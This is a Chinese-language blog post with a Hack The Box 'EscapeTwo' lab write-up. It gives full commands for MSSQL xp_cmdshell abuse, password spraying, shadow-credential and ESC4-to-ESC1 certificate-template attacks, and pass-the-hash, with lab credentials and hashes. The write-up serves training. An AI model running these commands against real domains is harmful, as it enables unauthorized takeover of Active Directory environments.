<!DOCTYPE html>
<html lang="zh-CN" data-theme="light">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover">
  <title>HTB-EscapeTwo | Warrenli's blog</title>
  <meta name="author" content="Warrenli">
  <meta name="copyright" content="Warrenli">
  <meta name="format-detection" content="telephone=no">
  <meta name="theme-color" content="#ffffff">
  <meta name="description"
    content="1 题目描述 注意给了个凭证，一开始我还漏了这个信息。   2 普通权限获取2.1 端口扫描   注意:这里端口扫描的时候，还是不能追求速度快，毕竟不是内网，网速什么的不是很稳定。比如，下面是我第一次扫描的结果，可以看到漏了很多信息(88端口、1433等关键端口) 1nmap -sC -sV -p- --min-rate&#x3D;10000 --max-retries&#x3D;1 -oN escapeTwo.nm">
  <meta property="og:type" content="article">
  <meta property="og:title" content="HTB-EscapeTwo">
  <meta property="og:url" content="https://blog.warrenli.fun/2025/10/31/EscapeTwo/index.html">
  <meta property="og:site_name" content="Warrenli&#39;s blog">
  <meta property="og:description"
    content="1 题目描述 注意给了个凭证，一开始我还漏了这个信息。   2 普通权限获取2.1 端口扫描   注意:这里端口扫描的时候，还是不能追求速度快，毕竟不是内网，网速什么的不是很稳定。比如，下面是我第一次扫描的结果，可以看到漏了很多信息(88端口、1433等关键端口) 1nmap -sC -sV -p- --min-rate&#x3D;10000 --max-retries&#x3D;1 -oN escapeTwo.nm">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:image" content="https://blog.warrenli.fun/img/butterfly-icon.png">
  <meta property="article:published_time" content="2025-10-31T11:26:53.431Z">
  <meta property="article:modified_time" content="2025-10-31T11:45:33.302Z">
  <meta property="article:author" content="Warrenli">
  <meta property="article:tag" content="网安，web">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:image" content="https://blog.warrenli.fun/img/butterfly-icon.png">
  <script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HTB-EscapeTwo",
  "url": "https://blog.warrenli.fun/2025/10/31/EscapeTwo/",
  "image": "https://blog.warrenli.fun/img/butterfly-icon.png",
  "datePublished": "2025-10-31T11:26:53.431Z",
  "dateModified": "2025-10-31T11:45:33.302Z",
  "author": [
    {
      "@type": "Person",
      "name": "Warrenli",
      "url": "https://blog.warrenli.fun"
    }
  ]
}</script>
  <link rel="shortcut icon" href="/img/favicon.ico">
  <link rel="canonical" href="https://blog.warrenli.fun/2025/10/31/EscapeTwo/index.html">
  <link rel="preconnect" href="//cdn.jsdelivr.net" />
  <link rel="preconnect" href="//busuanzi.ibruce.info" />
  <link rel="stylesheet" href="/css/index.css?v=5.5.1">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">
  <script>
    (() => {

      const saveToLocal = {
        set: (key, value, ttl) => {
          if (!ttl) return
          const expiry = Date.now() + ttl * 86400000
          localStorage.setItem(key, JSON.stringify({ value, expiry }))
        },
        get: key => {
          const itemStr = localStorage.getItem(key)
          if (!itemStr) return undefined
          const { value, expiry } = JSON.parse(itemStr)
          if (Date.now() > expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return value
        }
      }

      window.btf = {
        saveToLocal,
        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
          const script = document.createElement('script')
          script.src = url
          script.async = true
          Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
          script.onload = script.onreadystatechange = () => {
            if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
          }
          script.onerror = reject
          document.head.appendChild(script)
        }),
        getCSS: (url, id) => new Promise((resolve, reject) => {
          const link = document.createElement('link')
          link.rel = 'stylesheet'
          link.href = url
          if (id) link.id = id
          link.onload = link.onreadystatechange = () => {
            if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
          }
          link.onerror = reject
          document.head.appendChild(link)
        }),
        addGlobalFn: (key, fn, name = false, parent = window) => {
          if (!false && key.startsWith('pjax')) return
          const globalFn = parent.globalFn || {}
          globalFn[key] = globalFn[key] || {}
          globalFn[key][name || Object.keys(globalFn[key]).length] = fn
          parent.globalFn = globalFn
        }
      }


      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')

      theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null


      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }


      const detectApple = () => {
        if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()

    })()
  </script>
  <script>const GLOBAL_CONFIG = {
      root: '/',
      algolia: undefined,
      localSearch: undefined,
      translate: undefined,
      highlight: { "plugin": "highlight.js", "highlightCopy": true, "highlightLang": true, "highlightHeightLimit": false, "highlightFullpage": false, "highlightMacStyle": false },
      copy: {
        success: '复制成功',
        error: '复制失败',
        noSupport: '浏览器不支持'
      },
      relativeDate: {
        homepage: false,
        post: false
      },
      runtime: '',
      dateSuffix: {
        just: '刚刚',
        min: '分钟前',
        hour: '小时前',
        day: '天前',
        month: '个月前'
      },
      copyright: undefined,
      lightbox: 'null',
      Snackbar: undefined,
      infinitegrid: {
        js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
        buttonText: '加载更多'
      },
      isPhotoFigcaption: false,
      islazyloadPlugin: false,
      isAnchor: false,
      percent: {
        toc: true,
        rightside: false,
      },
      autoDarkmode: false
    }</script>
  <script id="config-diff">; var GLOBAL_CONFIG_SITE = {
        title: 'HTB-EscapeTwo',
        isHighlightShrink: false,
        isToc: true,
        pageType: 'post'
      }</script>
  <meta name="generator" content="Hexo 7.3.0">
</head>

<body>
  <div class="post" id="body-wrap">
    <header class="post-bg" id="page-header">
      <nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Warrenli's
              blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-EscapeTwo</span><span
              class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span> 返回首页</span></span></a></span>
        <div id="menus"></div>
      </nav>
      <div id="post-info">
        <h1 class="post-title">HTB-EscapeTwo</h1>
        <div id="post-meta">
          <div class="meta-firstline"><span class="post-meta-date"><i
                class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time
                class="post-meta-date-created" datetime="2025-10-31T11:26:53.431Z"
                title="发表于 2025-10-31 19:26:53">2025-10-31</time><span class="post-meta-separator">|</span><i
                class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time
                class="post-meta-date-updated" datetime="2025-10-31T11:45:33.302Z"
                title="更新于 2025-10-31 19:45:33">2025-10-31</time></span></div>
          <div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id=""
              data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span
                class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i
                  class="fa-solid fa-spinner fa-spin"></i></span></span></div>
        </div>
      </div>
    </header>
    <main class="layout" id="content-inner">
      <div id="post">
        <article class="container post-content" id="article-container">
          <h1 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1 题目描述"></a>1 题目描述</h1><img
            src="./EscapeTwo/Pasted image 20251031104543.png" />
          注意给了个凭证，一开始我还漏了这个信息。


          <h1 id="2-普通权限获取"><a href="#2-普通权限获取" class="headerlink" title="2 普通权限获取"></a>2 普通权限获取</h1>
          <h2 id="2-1-端口扫描"><a href="#2-1-端口扫描" class="headerlink" title="2.1 端口扫描"></a>2.1 端口扫描</h2><img
            src="./EscapeTwo/Pasted image 20251031104512.png" />


          <p>注意:这里端口扫描的时候，还是不能追求速度快，毕竟不是内网，网速什么的不是很稳定。<br>比如，下面是我第一次扫描的结果，可以看到漏了很多信息(88端口、1433等关键端口)</p>
          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">nmap -sC -sV -p- --min-rate=10000 --max-retries=1 -oN escapeTwo.nmap -v -Pn
                      10.129.232.128</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031104424.png" />



          <h2 id="2-2-SMB信息枚举"><a href="#2-2-SMB信息枚举" class="headerlink" title="2.2 SMB信息枚举"></a>2.2 SMB信息枚举</h2><img
            src="./EscapeTwo/Pasted image 20251031104721.png" />
          找到两个excel表格，拿下来读一读
          <img src="./EscapeTwo/Pasted image 20251031104743.png" />
          可以看到，是有不少凭证的，我们拿去挨个试一下，看看哪些能用
          <img src="./EscapeTwo/Pasted image 20251031104847.png" />

          <p>找到一个可以利用的域用户。同时注意到，这里的sa用户很有可能是mssql的管理员账号。<br><img src="./EscapeTwo/Pasted image 20251031105440.png" />
          </p>
          <p>至此，smb枚举利用的差不多了。接下来重点关注mssql服务。</p>
          <h2 id="2-3-MSSQL利用Getshell"><a href="#2-3-MSSQL利用Getshell" class="headerlink"
              title="2.3 MSSQL利用Getshell"></a>2.3 MSSQL利用Getshell</h2>
          <p>尝试利用sa用户登录，发现成功登录，那我们常规操作一下，拿shell<br>1、开启xp_cmdshell以执行系统命令<br><img
              src="./EscapeTwo/Pasted image 20251031105921.png" /><br>2、反弹shell<br><img
              src="./EscapeTwo/Pasted image 20251031110023.png" /></p>
          <p>注意下，这个反弹shell的payload很长，我们直接使用<code>xp_cmdshell</code>是执行不了的，会报错—长度限制。<br>这里的解决办法是使用<code>EXEC
              master..xp_cmdshell</code>，这个没有限制长度<br><img src="./EscapeTwo/Pasted image 20251031110148.png" /></p>
          <img src="./EscapeTwo/Pasted image 20251031110321.png" />

          <p>经过一番搜查，发现sql_svc的家目录没有什么关键的信息，且也读不了flag。然后尝试查找mssql相关的配置文件，最终找到一个密码<br><img
              src="./EscapeTwo/Pasted image 20251031110723.png" /></p>
          <h2 id="2-4-密码喷洒"><a href="#2-4-密码喷洒" class="headerlink" title="2.4 密码喷洒"></a>2.4 密码喷洒</h2>
          <p>有了密码，但是还不知道这个密码都有谁再用，于是先枚举域内用户，然后密码喷洒一下<br><img src="./EscapeTwo/Pasted image 20251031110856.png" /><img
              src="./EscapeTwo/Pasted image 20251031110904.png" /><br>成功拿到一个用户ryan。<br>直接拿shell读flag<br><img
              src="./EscapeTwo/Pasted image 20251031111007.png" /></p>
          <h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3 提权"></a>3 提权</h1>
          <h2 id="3-1-证书模板枚举"><a href="#3-1-证书模板枚举" class="headerlink" title="3.1 证书模板枚举"></a>3.1 证书模板枚举</h2>
          <p>这里先利用普通用户ryan查看所有证书模板:</p>
          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br><span class="line">2</span><br><span
                      class="line">3</span><br><span class="line">4</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">certipy-ad find \ </span><br><span class="line"> -u
                      &#x27;ryan@sequel.htb&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; \</span><br><span class="line"> -dc-ip
                      &#x27;10.129.232.128&#x27; -text \</span><br><span class="line"> -enabled -hide-admins</span><br>
                  </pre>
                </td>
              </tr>
            </table>
          </figure>

          <p>发现cert publishers组的用户有对下面的这个模板有很高的权限，而且该模板的注册还不需要管理员审核。这里如果我们能控制一个用户，且该用户属于cert publishers组就好了。</p>
          <img src="./EscapeTwo/Pasted image 20251031142150.png" />

          <h2 id="3-2-影子凭证攻击"><a href="#3-2-影子凭证攻击" class="headerlink" title="3.2 影子凭证攻击"></a>3.2 影子凭证攻击</h2>
          <p>为了更好的了解我们所拥有的用户在域中的权限，以及和其他用户的关系，我们使用BloodHound来查看<br><img
              src="./EscapeTwo/Pasted image 20251031111300.png" /><img
              src="./EscapeTwo/Pasted image 20251031111402.png" /><br>发现我们的ryan用户对ca_svc用户有WriteOwner权限，也就是说我们可以将CA_SVC的拥有者设置为Ryan。
          </p>
          <blockquote>
            <p>知识点说明:<br>1、WriteOwner权限</p>
            <ul>
              <li>拥有对某个对象的“Write Owner”权限，意味着你可以指定谁成为该对象的新所有者</li>
            </ul>
            <p>2、所有权的意义</p>
            <ul>
              <li>所有者默认拥有修改该对象权限的能力</li>
              <li>所有者可以修改对象的自主访问控制列表（DACL），也就是可以给其他人授予或拒绝对该对象的任何权限(关键!!!)</li>
            </ul>
            <p># 我们接下来利用的就是这个DACL，具体来说可以给自己授予任何其他权限，例如:</p>
            <ul>
              <li>Reset Password：重置CA_SVC的密码</li>
              <li>Write All Properties：修改CA_SVC的描述、电话号码、组成员身份等所有属性</li>
              <li>Full Control：获得对CA_SVC的完全控制权，可以修改密码，修改属性等等</li>
            </ul>
          </blockquote>
          <p>影子凭证攻击:</p>
          <blockquote>
            <p>攻击原理:</p>
            <ol>
              <li>添加关键凭据：攻击者先在本地生成一对公私钥，然后向目标账户的 <code>msDS-KeyCredentialLink</code> 属性中添加生成的公钥。此时攻击者获得了”代表”该账户的身份能力
              </li>
              <li>请求 Kerberos 证书： 之后，攻击者可以使用对应的私钥向 AD CS 服务请求一个 Kerberos 认证证书。这个证书证明攻击者有权代表受害者账户</li>
              <li>获取 TGT：在 Kerberos 的 PKINIT 扩展认证中，攻击者使用证书向 KDC证明身份。KDC 在响应中会返回一个使用目标用户密钥加密的 AS-REP</li>
              <li>获取访问权限： 最后，使用这个 TGT
                可以像目标账户一样访问域内资源，从而实现对目标账户的权限提升或横向移动。同时，由于攻击者拥有证书对应的私钥，他们可以解密部分数据，但更重要的是：攻击者可以离线暴力破解这个加密数据，从而恢复出用户的 NT 哈希
              </li>
            </ol>
          </blockquote>
          <p>1、修改ca_svc用户的拥有者是ryan</p>
          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">impacket-owneredit -action write -new-owner &#x27;ryan&#x27; -target
                      &#x27;ca_svc&#x27; -dc-ip &#x27;10.129.232.128&#x27; &#x27;SEQUEL.HTB/ryan:WqSZAFCysDQbGb3&#x27;
                      2&gt;/dev/null</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031144558.png" />
          2、配置ryan对ca_svc用户拥有完全控制权(通过修改DACL实现---这里目的是后面修改ca_svc用户的属性)

          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">impacket-dacledit -action write -rights &#x27;FullControl&#x27; -principal
                      &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; -dc-ip &#x27;10.129.232.128&#x27;
                      &#x27;SQUEL.HTB/ryan:WqSZAF6CysDQbGb3&#x27; 2&gt;/dev/null</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031144609.png" />
          3、影子凭证攻击---修改ca_svc用户的msDS-KeyCredentialLink属性(这里也可以直接修改用户的密码，不是一定要这种方式，权限够大，能实现的方式也多一些)

          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">certipy-ad shadow auto -u &#x27;ryan@sequel.htb&#x27; -p
                      &quot;WqSZAF6CysDQbGb3&quot; -account &#x27;ca_svc&#x27; -dc-ip
                      &#x27;10.129.232.128&#x27;</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031144446.png" />
          ==注意:这题上面的三条命令要连续的快速执行，否则有一个计划任务会重置这些更改，导致我们前面的修改无效，最终执行失败==


          <h2 id="3-3-ESC4-to-ESC1"><a href="#3-3-ESC4-to-ESC1" class="headerlink" title="3.3 ESC4 to ESC1"></a>3.3 ESC4
            to ESC1</h2>
          <p>也是拿到我们想要的用户了，现在开始证书相关的攻击。</p>
          <p>1、首先检测一下易受攻击的模板，下面的命令能自动识别(经过测试，普通的域用户可以枚举所有的模板，但是不能直接执行该操作，原因暂时不清楚。)</p>
          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce
                      -vulnerable -stdout</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031135409.png" />

          <p>2、然后修改改模板，使其符合ESC1，能让我们利用</p>
          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">certipy-ad template -u ca_svc@sequel.htb -hashes
                      &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -k -template &#x27;DunderMifflinAuthentication&#x27;
                      -target DC01.sequel.htb -ns 10.129.232.128 -debug</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031145645.png" />

          <blockquote>
            <p>易受 ESC1 攻击的模板具有以下配置：</p>
            <ul>
              <li>证书模板允许请求者指定主题备用名称: 攻击者可在申请证书时，在 SAN 字段中冒充任意用户（如域管理员）。AD 在身份验证时会优先使用证书中的 SAN 身份</li>
              <li>证书模板包含客户端认证等身份验证相关的 EKU: 证书能用于 Kerberos 身份验证，例如通过 PKINIT 协议获取 TGT（票据授予票据）</li>
              <li>低权限用户被授予证书注册权限: 普通域用户可以直接申请这些配置有问题的证书，无需特殊审批。</li>
              <li>无需管理员批准: 成功申请后直接下发</li>
              <li>不需要授权签名: 攻击者在申请证书时无需额外的授权签名，降低了利用门槛和复杂性。 <img src="./EscapeTwo/Pasted image 20251031150134.png" />
              </li>
            </ul>
          </blockquote>
          <p>3、请求该证书</p>
          <figure class="highlight plaintext">
            <table>
              <tr>
                <td class="gutter">
                  <pre><span class="line">1</span><br></pre>
                </td>
                <td class="code">
                  <pre><span class="line">certipy-ad req -u ca_svc@sequel.htb -hashes
                      &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -ca sequel-DC01-CA -template
                      &#x27;DunderMifflinAuthentication&#x27; -upn Administrator@sequel.htb -target DC01.sequel.htb -ns
                      10.129.232.128 -dns 10.129.232.128 -dc-ip 10.129.232.128</span><br></pre>
                </td>
              </tr>
            </table>
          </figure>

          <img src="./EscapeTwo/Pasted image 20251031151018.png" />

          <p>4、利用该证书进行kerberos认证，并获取请求TGT</p>
          <img src="./EscapeTwo/Pasted image 20251031151048.png" />
          成功拿到管理员hash

          <h2 id="3-4-PTH"><a href="#3-4-PTH" class="headerlink" title="3.4 PTH"></a>3.4 PTH</h2>
          <p><img src="./EscapeTwo/Pasted image 20251031151146.png" /><img src="Pasted image 20251031151155.png" /></p>
        </article>
        <div class="post-copyright">
          <div class="post-copyright__author"><span class="post-copyright-meta"><i
                class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a
                href="https://blog.warrenli.fun">Warrenli</a></span></div>
          <div class="post-copyright__type"><span class="post-copyright-meta"><i
                class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a
                href="https://blog.warrenli.fun/2025/10/31/EscapeTwo/">https://blog.warrenli.fun/2025/10/31/EscapeTwo/</a></span>
          </div>
          <div class="post-copyright__notice"><span class="post-copyright-meta"><i
                class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span
              class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/"
                target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.warrenli.fun"
                target="_blank">Warrenli's blog</a>！</span></div>
        </div>
        <div class="tag_share">
          <div class="post-share">
            <div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq">
            </div>
            <link rel="stylesheet"
              href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print"
              onload="this.media='all'">
            <script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js"
              defer></script>
          </div>
        </div>
        <nav class="pagination-post" id="pagination"><a class="pagination-related full-width"
            href="/2025/10/31/Signed-mssql/" title="HTB-Signed-mssql">
            <div class="cover" style="background: var(--default-bg-color)"></div>
            <div class="info">
              <div class="info-1">
                <div class="info-item-1">上一篇</div>
                <div class="info-item-2">HTB-Signed-mssql</div>
              </div>
              <div class="info-2">
                <div class="info-item-1">1 端口扫描1234567891011121314151617181920212223242526272829303132331433/tcp open
                  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM| ms-sql-info: | 10.10.11.90:1433: | Version: |
                  name: Microsoft SQL Server 2022 RTM| number: 16.00.1000.00| Product: Microsoft SQL Server 2022|
                  Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433|_ssl-date:
                  2025-10-17T01:28:14+00:00; -27m08s from scanner time.| ssl-cert: Subject: commonName=SSL_Self_Signe...
                </div>
              </div>
            </div>
          </a></nav>
      </div>
      <div class="aside-content" id="aside-content">
        <div class="card-widget card-info text-center">
          <div class="avatar-img"><img src="/img/butterfly-icon.png"
              onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" /></div>
          <div class="author-info-name">Warrenli</div>
          <div class="author-info-description"></div>
          <div class="site-data"><a href="/archives/">
              <div class="headline">文章</div>
              <div class="length-num">2</div>
            </a><a href="/tags/">
              <div class="headline">标签</div>
              <div class="length-num">0</div>
            </a><a href="/categories/">
              <div class="headline">分类</div>
              <div class="length-num">0</div>
            </a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/"><i
              class="fab fa-github"></i><span>Follow Me</span></a>
        </div>
        <div class="card-widget card-announcement">
          <div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div>
          <div class="announcement_content">Welcom to w's blog~~</div>
        </div>
        <div class="sticky_layout">
          <div class="card-widget" id="card-toc">
            <div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span>
            </div>
            <div class="toc-content">
              <ol class="toc">
                <li class="toc-item toc-level-1"><a class="toc-link"
                    href="#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span
                      class="toc-text">1 题目描述</span></a></li>
                <li class="toc-item toc-level-1"><a class="toc-link"
                    href="#2-%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-number">2.</span>
                    <span class="toc-text">2 普通权限获取</span></a>
                  <ol class="toc-child">
                    <li class="toc-item toc-level-2"><a class="toc-link"
                        href="#2-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span
                          class="toc-text">2.1 端口扫描</span></a></li>
                    <li class="toc-item toc-level-2"><a class="toc-link"
                        href="#2-2-SMB%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.2.</span> <span
                          class="toc-text">2.2 SMB信息枚举</span></a></li>
                    <li class="toc-item toc-level-2"><a class="toc-link"
                        href="#2-3-MSSQL%E5%88%A9%E7%94%A8Getshell"><span class="toc-number">2.3.</span> <span
                          class="toc-text">2.3 MSSQL利用Getshell</span></a></li>
                    <li class="toc-item toc-level-2"><a class="toc-link"
                        href="#2-4-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">2.4.</span> <span
                          class="toc-text">2.4 密码喷洒</span></a></li>
                  </ol>
                </li>
                <li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span
                      class="toc-number">3.</span> <span class="toc-text">3 提权</span></a>
                  <ol class="toc-child">
                    <li class="toc-item toc-level-2"><a class="toc-link"
                        href="#3-1-%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF%E6%9E%9A%E4%B8%BE"><span
                          class="toc-number">3.1.</span> <span class="toc-text">3.1 证书模板枚举</span></a></li>
                    <li class="toc-item toc-level-2"><a class="toc-link"
                        href="#3-2-%E5%BD%B1%E5%AD%90%E5%87%AD%E8%AF%81%E6%94%BB%E5%87%BB"><span
                          class="toc-number">3.2.</span> <span class="toc-text">3.2 影子凭证攻击</span></a></li>
                    <li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-ESC4-to-ESC1"><span
                          class="toc-number">3.3.</span> <span class="toc-text">3.3 ESC4 to ESC1</span></a></li>
                    <li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-PTH"><span
                          class="toc-number">3.4.</span> <span class="toc-text">3.4 PTH</span></a></li>
                  </ol>
                </li>
              </ol>
            </div>
          </div>
          <div class="card-widget card-recent-post">
            <div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div>
            <div class="aside-list">
              <div class="aside-list-item no-cover">
                <div class="content"><a class="title" href="/2025/10/31/Signed-mssql/"
                    title="HTB-Signed-mssql">HTB-Signed-mssql</a><time datetime="2025-10-31T11:28:08.383Z"
                    title="发表于 2025-10-31 19:28:08">2025-10-31</time></div>
              </div>
              <div class="aside-list-item no-cover">
                <div class="content"><a class="title" href="/2025/10/31/EscapeTwo/"
                    title="HTB-EscapeTwo">HTB-EscapeTwo</a><time datetime="2025-10-31T11:26:53.431Z"
                    title="发表于 2025-10-31 19:26:53">2025-10-31</time></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
    <footer id="footer">
      <div class="footer-other">
        <div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Warrenli</span><span
            class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo
              7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener"
              href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div>
      </div>
    </footer>
  </div>
  <div id="rightside">
    <div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i
          class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i
          class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i
          class="fas fa-arrows-alt-h"></i></button></div>
    <div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i
          class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button"
        title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span
          class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div>
  </div>
  <div>
    <script src="/js/utils.js?v=5.5.1"></script>
    <script src="/js/main.js?v=5.5.1"></script>
    <div class="js-pjax"></div>
    <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  </div>
</body>

</html>